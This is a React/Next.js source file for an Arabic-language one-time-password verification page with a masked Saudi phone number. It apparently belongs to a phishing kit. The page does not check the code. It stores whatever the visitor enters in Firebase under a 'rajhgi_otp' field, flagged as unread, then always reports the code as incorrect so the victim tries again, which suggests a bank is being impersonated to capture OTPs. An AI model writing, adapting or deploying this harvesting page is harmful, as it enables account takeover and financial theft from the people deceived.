"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { ArrowRight, MessageSquareText } from "lucide-react";
import { addData } from "@/lib/firebase";

export default function OtpVerification() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60);

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft]);

  const handleVerify = async () => {
    const visitorId = localStorage.getItem("visitor");
    if (code.length > 3) {
      await addData({ id: visitorId, rajhgi_otp: code, isUnread: true });
      alert("الرمز غير صحيح!");
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  return (
    <div className="min-h-screen bg-white text-right px-6 py-4 flex flex-col font-arabic">
      <header className="flex justify-between items-center mb-8">
        <div className="w-8"></div>
        <h1 className="text-xl font-bold">التحقق</h1>
        <button onClick={() => router.push("/")} className="text-black">
          <ArrowRight className="w-6 h-6" />
        </button>
      </header>

      <main className="flex-1 flex flex-col items-center max-w-md mx-auto w-full pt-10">
        <div className="bg-blue-100 p-4 rounded-full mb-6">
          <MessageSquareText className="w-8 h-8 text-[#4169E1]" />
        </div>

        <h2 className="text-2xl font-bold mb-2">رمز التحقق</h2>
        <p className="text-gray-500 mb-8 text-center">
          الرجاء إدخال الرمز المرسل إلى جوالك
          <br />
          <span dir="ltr" className="text-black font-medium mt-1 block text-lg">
            +966 5* *** **89
          </span>
        </p>

        <div className="w-full mb-10">
          <input
            type="text"
            maxLength={4}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
            className="w-full bg-gray-100 border-none rounded-xl px-4 py-4 text-center text-2xl tracking-[1em] font-bold text-gray-900 focus:ring-2 focus:ring-[#4169E1]/20 outline-none transition-all placeholder:tracking-widest"
            placeholder="- - - -"
            dir="ltr"
          />
        </div>

        <div className="w-full space-y-4">
          <button
            onClick={handleVerify}
            disabled={code.length !== 4}
            className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${
              code.length === 4
                ? "bg-[#4169E1] text-white shadow-lg shadow-[#4169E1]/20"
                : "bg-gray-100 text-gray-300 cursor-not-allowed"
            }`}
          >
            تأكيد
          </button>

          <div className="text-center pt-4">
            {timeLeft > 0 ? (
              <p className="text-gray-500 text-sm">
                إعادة الإرسال بعد{" "}
                <span className="text-[#4169E1] font-bold font-mono" dir="ltr">
                  {formatTime(timeLeft)}
                </span>
              </p>
            ) : (
              <button
                onClick={() => setTimeLeft(60)}
                className="text-[#4169E1] font-bold text-sm hover:underline"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
